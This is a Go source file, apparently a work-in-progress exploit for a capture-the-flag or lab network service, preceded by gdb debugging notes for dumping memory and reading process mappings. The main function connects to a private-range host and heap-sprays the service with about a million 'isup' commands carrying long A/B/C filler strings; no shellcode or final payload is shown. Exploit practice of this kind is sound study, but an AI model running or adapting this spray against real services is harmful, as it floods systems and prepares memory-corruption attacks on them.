/* notes:

gdb lazy

---
set pagination off
set disassembly-flavor intel

define xxd
 dump binary memory dump.bin $arg0 $arg0+$arg1
 shell xxd dump.bin
 shell rm dump.bin
end

printf "base addresses: "
info proc mappings

c
---
*/

package main

import (
	"bytes"
	"flag"
	"strings"
	"time"
	"io"
	"net"
	"fmt"
	"log"
)

var interactive = false
var registrations = make([]string,128)

func sploit(conn net.Conn) {
	// heapspray
	fmt.Println("spraying!")
	for i := 0; i < 0x100000; i++ {
		var blob strings.Builder
		blob.WriteString(strings.Repeat("A",128))
		blob.WriteString(strings.Repeat("B",128))
		blob.WriteString(strings.Repeat("C",128))
		isup(conn,blob.String())
	}
}

func read(conn net.Conn) string {
	buf := make([]byte, 4096)
	tmp := make([]byte, 8)
	for {
		err := conn.SetReadDeadline(time.Now().Add(time.Millisecond * 200))
		check("main,SetReadDeadline",err)
		n, err := conn.Read(tmp)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			if err != io.EOF {
				fmt.Printf("main,Read: %s\n",err)
			}
			break
		}
		buf = append(buf,tmp[:n]...) 
	}
	
	if len(string(buf)) > 0 {
		return fmt.Sprintf("%s",buf)
	} else {
		return ""
	}
}

func isup(conn net.Conn, name string) {
	_, err := fmt.Fprintf(conn,fmt.Sprintf("isup %s 8000\n",name))
	check("isup",err)
}

func checkname(conn net.Conn, name string) {
	//h := hash([]byte(name),len(name))
	//fmt.Printf("[checkname] name{%s} generated index{%d}\n",name,h)
	_, err := fmt.Fprintf(conn, "checkname %s\n",name)
	check("checkname",err)
}

func check(where string, err error) {
	if err != nil {
		log.Fatalf("[%s] - %s\n",where,err)
	}
}

func main() {
	conn, err := net.Dial("tcp","10.11.11.6:20005")
	check("main,net.Dial",err)
	defer conn.Close()

	sploit(conn)
}
